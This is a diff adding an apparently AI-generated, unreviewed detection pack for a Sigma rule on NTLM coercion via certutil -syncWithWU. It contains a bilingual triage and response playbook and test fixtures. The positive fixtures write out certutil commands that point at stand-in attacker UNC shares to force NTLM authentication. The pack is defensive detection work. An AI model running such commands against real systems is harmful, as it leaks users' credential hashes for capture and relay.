@@ -1,0 +1,135 @@
+{
+  "rule": {
+    "id": "6c6d9280-e6d0-4b9d-80ac-254701b64916",
+    "title": "Potential NTLM Coercion Via Certutil.EXE",
+    "level": "high",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_certutil_ntlm_coercion.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_certutil_ntlm_coercion.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó certutil.exe con la opción -syncWithWU y un destino UNC (\\\\host\\recurso). Esto puede obligar al equipo a autenticarse por SMB/NTLM ante un servidor remoto y exponer el hash NetNTLM del usuario.",
+      "what_it_detects": "Eventos de creación de procesos donde Image termina en \\certutil.exe u OriginalFileName es CertUtil.exe, y CommandLine contiene ' -syncwithWU ' seguido de una ruta UNC (' \\\\').",
+      "why_it_matters": "La opción -syncWithWU descarga certificados de Windows Update a una carpeta de destino. Si esa carpeta es una ruta UNC, Windows se autentica ante el host remoto. Así un atacante captura o reenvía (relay) credenciales NTLM usando un binario firmado de Microsoft (T1218, ejecución mediante binarios del sistema).",
+      "triage_steps": [
+        "Revise CommandLine completo: identifique el host o IP de la ruta UNC y verifique si es un servidor interno conocido o una dirección externa o inusual.",
+        "Confirme Image y OriginalFileName; un certutil.exe fuera de System32 o SysWOW64 sugiere renombrado o suplantación.",
+        "Analice ParentImage y la cadena de procesos padre: cmd, PowerShell, wscript o un documento de Office como padre aumentan la sospecha.",
+        "Identifique la cuenta (User) y si tiene privilegios; una cuenta de equipo o de administrador expuesta tiene mayor impacto.",
+        "Busque en telemetría de red conexiones a TCP 445/139 o WebDAV (80/443) del mismo host hacia el destino UNC dentro de +/- 15 minutos.",
+        "En el destino o en los controladores de dominio, busque autenticaciones NTLM (4624 tipo 3, 4648) originadas desde esa IP, que indicarían un relay.",
+        "Revise otras alertas del mismo host y usuario: uso previo de certutil, herramientas de relay o movimiento lateral."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos; el uso legítimo de -syncWithWU hacia un recurso compartido es raro.",
+        "Un administrador que sincroniza certificados raíz a un recurso compartido interno para distribuirlos en entornos sin conexión; confírmelo con el equipo de PKI o infraestructura."
+      ],
+      "response_steps": [
+        "Valide con el dueño del equipo o el usuario si la ejecución fue autorizada antes de actuar.",
+        "Si no hay justificación, bloquee la IP o el host de la ruta UNC en el firewall perimetral e interno y aísle el endpoint afectado.",
+        "Restablezca la contraseña de la cuenta expuesta; si fue una cuenta de equipo o privilegiada, coordine con el equipo de identidad.",
+        "Investigue y elimine el mecanismo de ejecución (script, tarea programada, macro) que lanzó certutil.",
+        "Refuerce controles: firma SMB obligatoria, bloqueo de SMB saliente, protección EPA/LDAP signing y restricción de NTLM donde sea viable."
+      ],
+      "severity_rationale": "El nivel high es adecuado porque la combinación de -syncWithWU con destino UNC casi no tiene uso legítimo y puede exponer credenciales reutilizables para relay."
+    },
+    "en": {
+      "summary": "certutil.exe ran with -syncWithWU and a UNC destination (\\\\host\\share). This can force the machine to authenticate over SMB/NTLM to a remote server and leak the user's NetNTLM hash.",
+      "what_it_detects": "Process creation events where Image ends with \\certutil.exe or OriginalFileName is CertUtil.exe, and CommandLine contains ' -syncwithWU ' plus a UNC path (' \\\\').",
+      "why_it_matters": "-syncWithWU downloads certificates from Windows Update into a destination folder. When that folder is a UNC path, Windows authenticates to the remote host, letting an attacker capture or relay NTLM credentials through a signed Microsoft binary (T1218, system binary proxy execution).",
+      "triage_steps": [
+        "Read the full CommandLine: extract the host or IP in the UNC path and check whether it is a known internal server or an external or unusual address.",
+        "Confirm Image and OriginalFileName; certutil.exe outside System32 or SysWOW64 suggests renaming or masquerading.",
+        "Review ParentImage and the process tree: cmd, PowerShell, wscript or an Office document as parent raises suspicion.",
+        "Identify the User and its privileges; an exposed machine or admin account has higher impact.",
+        "Check network telemetry for TCP 445/139 or WebDAV (80/443) connections from the same host to the UNC target within +/- 15 minutes.",
+        "On the target and domain controllers, look for NTLM logons (4624 type 3, 4648) from that IP indicating relay.",
+        "Review other alerts for the same host and user: prior certutil use, relay tooling or lateral movement."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives; legitimate -syncWithWU to a network share is rare.",
+        "An administrator syncing root certificates to an internal share for offline distribution; confirm with the PKI or infrastructure team."
+      ],
+      "response_steps": [
+        "Confirm with the host owner or user whether the execution was authorized before acting.",
+        "If unjustified, block the UNC host or IP at internal and perimeter firewalls and isolate the affected endpoint.",
+        "Reset the exposed account's password; for machine or privileged accounts, coordinate with the identity team.",
+        "Find and remove the launcher (script, scheduled task, macro) that started certutil.",
+        "Harden: enforce SMB signing, block outbound SMB, enable EPA/LDAP signing and restrict NTLM where feasible."
+      ],
+      "severity_rationale": "High fits because -syncWithWU with a UNC destination has almost no legitimate use and can expose relayable credentials."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "certutil syncs Windows Update certificates to an attacker-controlled UNC share, forcing NTLM authentication",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "certutil.exe -syncwithWU \\\\198.51.100.23\\share",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c certutil.exe -syncwithWU \\\\198.51.100.23\\share",
+          "CurrentDirectory": "C:\\Users\\jperez\\"
+        }
+      },
+      {
+        "description": "Renamed certutil binary matched via OriginalFileName, launched from PowerShell with a UNC destination",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Users\\Public\\cu.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "C:\\Users\\Public\\cu.exe -f -syncwithWU \\\\files.example.org\\drop",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CurrentDirectory": "C:\\Users\\Public\\"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Administrator syncs Windows Update certificates to a local folder; no UNC path",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-PKI-01.andes.example.com",
+          "User": "ANDES\\adm_lgomez",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "certutil.exe -syncwithWU C:\\PKI\\WURoots",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CurrentDirectory": "C:\\PKI\\"
+        }
+      },
+      {
+        "description": "certutil reads a CRL from a UNC share without the -syncWithWU flag",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "certutil.exe -dump \\\\fileserver01.andes.example.com\\pki\\root.crl",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CurrentDirectory": "C:\\Users\\jperez\\"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
